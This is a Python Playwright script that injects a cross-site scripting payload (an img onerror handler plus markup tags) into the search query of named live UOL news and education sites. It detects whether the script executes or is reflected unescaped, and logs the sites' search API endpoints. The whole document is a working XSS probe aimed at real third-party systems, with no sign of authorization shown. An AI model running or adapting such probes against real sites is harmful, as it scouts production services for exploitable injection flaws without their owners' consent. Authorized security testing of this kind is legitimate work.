#!/usr/bin/env python3
"""Load content-site search with payload, observe rendered DOM for DOM-XSS + capture search API."""
import time
from playwright.sync_api import sync_playwright
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
CANARY="uolqx8842"
PAY=CANARY+'<img src=x onerror=window.__X=1><svg><u>C</u>'
tests=[
 ("brasilescola", f"https://brasilescola.uol.com.br/busca/?q={PAY}"),
 ("ne10", f"https://ne10.uol.com.br/search/?q={PAY}"),
 ("brasilescola_busca2", f"https://brasilescola.uol.com.br/busca?q={PAY}"),
]
with sync_playwright() as p:
    b=p.chromium.launch(channel="chrome",headless=True,args=["--no-sandbox","--disable-dev-shm-usage"])
    for name,url in tests:
        ctx=b.new_context(user_agent=UA,locale="pt-BR")
        pg=ctx.new_page()
        api=[]
        fired={"x":None,"dialog":False}
        pg.on("dialog",lambda d:(fired.__setitem__("dialog",True),d.dismiss()))
        pg.on("request",lambda r:api.append(r.url) if any(k in r.url.lower() for k in["busca","search","api","suggest","autocomplete","query"]) else None)
        try:
            pg.goto(url,wait_until="networkidle",timeout=35000)
            time.sleep(3)
            try: fired["x"]=pg.evaluate("window.__X||null")
            except: pass
            html=pg.content()
            raw_img = html.count("<img src=x onerror")   # unescaped reflection?
            raw_u = "<u>C</u>" in html
            canary_txt = CANARY in pg.inner_text("body")[:5000] if True else False
            print(f"[{name}] xss_fired={fired['x']} dialog={fired['dialog']} unescaped_img={raw_img} unescaped_u={raw_u} canary_in_text={CANARY in html}")
            # search API endpoints observed
            for u in sorted(set(a for a in api if CANARY.lower() in a.lower() or "busca" in a.lower() or "search" in a.lower()))[:4]:
                print(f"     API: {u[:120]}")
        except Exception as e:
            print(f"[{name}] ERR {repr(e)[:70]}")
        ctx.close()
    b.close()
